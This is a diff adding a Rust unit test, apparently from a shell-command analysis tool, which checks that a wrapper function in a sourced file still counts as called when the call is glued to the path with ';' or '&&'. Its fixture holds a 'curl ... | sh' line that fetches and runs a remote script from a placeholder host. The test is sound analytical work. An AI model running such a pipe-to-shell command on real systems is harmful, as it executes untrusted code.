@@ -345,3 +345,19 @@ fn a_dead_wrapper_hands_the_command_no_owners() {
     // Sourcing the file by that name is not a call to the wrapper inside it.
     assert!(super::bounds_its_owners(activate, "source ./pydoc"));
 }
+
+/// A separator needs no space around it, so the word that holds the path holds
+/// the call as well. Reading only whole words would drop both together and
+/// leave the wrapper looking dead.
+#[test]
+fn a_call_glued_to_the_sourced_path_keeps_the_wrapper_alive() {
+    let text = "foo () {\n    curl -fsSL https://example.invalid/i.sh | sh\n}\n";
+    for command in [
+        "source ./f;foo",
+        ". ./f&&foo",
+        "source ./f && cd /tmp&&foo",
+        "source ./f; foo",
+    ] {
+        assert!(!super::bounds_its_owners(text, command), "{command}");
+    }
+}
